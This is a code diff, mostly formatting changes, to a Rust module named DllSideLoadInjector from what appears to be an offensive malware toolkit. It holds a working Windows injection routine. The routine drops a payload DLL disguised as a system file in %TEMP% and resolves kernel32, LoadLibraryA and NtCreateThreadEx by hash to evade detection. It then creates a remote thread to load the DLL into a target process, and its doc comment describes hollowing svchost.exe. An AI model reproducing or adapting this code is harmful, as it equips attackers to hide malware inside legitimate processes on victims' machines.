@@ -1,3 +1,4 @@
+use crate::injection::Injector;
 /// DLL side-loading injection (S-05).
 ///
 /// Runtime approach: write the payload as a DLL to a location on the target
@@ -15,34 +16,28 @@
 /// image, the DLL's DllMain calls `hollowing::inject_into_process` against
 /// a new svchost.exe process and then returns TRUE so the host process is
 /// not disturbed.
-
 use anyhow::{anyhow, Result};
-use crate::injection::Injector;
 
 pub struct DllSideLoadInjector;
 
 #[cfg(windows)]
 impl Injector for DllSideLoadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::processthreadsapi::OpenProcess;
-        use winapi::um::winnt::{
-            PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_CREATE_THREAD,
-            PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
-        };
         use winapi::um::handleapi::CloseHandle;
         use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+        use winapi::um::processthreadsapi::OpenProcess;
         use winapi::um::synchapi::WaitForSingleObject;
         use winapi::um::winbase::INFINITE;
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+        use winapi::um::winnt::{
+            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
+            PROCESS_VM_READ, PROCESS_VM_WRITE,
+        };
 
         // ── 1. Write the payload DLL to a temp path ─────────────────────
         // Use %TEMP% with a name that resembles a Windows system DLL.
         let tmp = std::env::temp_dir();
-        let dll_name = format!(
-            "{}\\dxgi-{}.dll",
-            tmp.display(),
-            std::process::id()
-        );
+        let dll_name = format!("{}\\dxgi-{}.dll", tmp.display(), std::process::id());
         let dll_name_c = std::ffi::CString::new(dll_name.as_str())
             .map_err(|_| anyhow!("DLL path has interior NUL"))?;
 
@@ -56,8 +51,11 @@ impl Injector for DllSideLoadInjector {
         // ── 2. Open target process ──────────────────────────────────────
         let h_proc = unsafe {
             OpenProcess(
-                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
-                    | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
+                PROCESS_VM_OPERATION
+                    | PROCESS_VM_WRITE
+                    | PROCESS_VM_READ
+                    | PROCESS_CREATE_THREAD
+                    | PROCESS_QUERY_INFORMATION,
                 0,
                 pid,
             )
@@ -71,7 +69,11 @@ impl Injector for DllSideLoadInjector {
         let kernel32_base = unsafe {
             pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"KERNEL32.DLL\0"))
         }
-        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("kernel32 not found") })?;
+        .ok_or_else(|| {
+            cleanup();
+            unsafe { CloseHandle(h_proc) };
+            anyhow!("kernel32 not found")
+        })?;
 
         let loadlib_addr = unsafe {
             pe_resolve::get_proc_address_by_hash(
@@ -79,12 +81,19 @@ impl Injector for DllSideLoadInjector {
                 pe_resolve::hash_str(b"LoadLibraryA\0"),
             )
         }
-        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("LoadLibraryA not found") })?;
+        .ok_or_else(|| {
+            cleanup();
+            unsafe { CloseHandle(h_proc) };
+            anyhow!("LoadLibraryA not found")
+        })?;
 
-        let ntdll_base = unsafe {
-            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-        }
-        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("ntdll not found") })?;
+        let ntdll_base =
+            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
+                .ok_or_else(|| {
+                    cleanup();
+                    unsafe { CloseHandle(h_proc) };
+                    anyhow!("ntdll not found")
+                })?;
 
         let ntcreate_addr = unsafe {
             pe_resolve::get_proc_address_by_hash(
@@ -92,12 +101,23 @@ impl Injector for DllSideLoadInjector {
                 pe_resolve::hash_str(b"NtCreateThreadEx\0"),
             )
         }
-        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("NtCreateThreadEx not found") })?;
+        .ok_or_else(|| {
+            cleanup();
+            unsafe { CloseHandle(h_proc) };
+            anyhow!("NtCreateThreadEx not found")
+        })?;
 
         type NtCreateThreadExFn = unsafe extern "system" fn(
-            *mut *mut std::os::raw::c_void, u32, *mut std::os::raw::c_void,
-            *mut std::os::raw::c_void, *mut std::os::raw::c_void,
-            *mut std::os::raw::c_void, u32, usize, usize, usize,
+            *mut *mut std::os::raw::c_void,
+            u32,
+            *mut std::os::raw::c_void,
+            *mut std::os::raw::c_void,
+            *mut std::os::raw::c_void,
+            *mut std::os::raw::c_void,
+            u32,
+            usize,
+            usize,
+            usize,
             *mut std::os::raw::c_void,
         ) -> i32;
         let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };
@@ -139,14 +159,22 @@ impl Injector for DllSideLoadInjector {
                 h_proc,
                 loadlib_addr as *mut _,
                 remote_path,
-                0, 0, 0, 0,
+                0,
+                0,
+                0,
+                0,
                 std::ptr::null_mut(),
             )
         };
         if status < 0 || h_thread.is_null() {
             cleanup();
             unsafe {
-                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_path, 0, winapi::um::winnt::MEM_RELEASE);
+                winapi::um::memoryapi::VirtualFreeEx(
+                    h_proc,
+                    remote_path,
+                    0,
+                    winapi::um::winnt::MEM_RELEASE,
+                );
                 CloseHandle(h_proc);
             }
             return Err(anyhow!("DllSideLoad: NtCreateThreadEx failed: {status:#x}"));
@@ -156,7 +184,12 @@ impl Injector for DllSideLoadInjector {
         unsafe {
             WaitForSingleObject(h_thread, INFINITE);
             CloseHandle(h_thread);
-            winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_path, 0, winapi::um::winnt::MEM_RELEASE);
+            winapi::um::memoryapi::VirtualFreeEx(
+                h_proc,
+                remote_path,
+                0,
+                winapi::um::winnt::MEM_RELEASE,
+            );
             CloseHandle(h_proc);
         }
         cleanup();
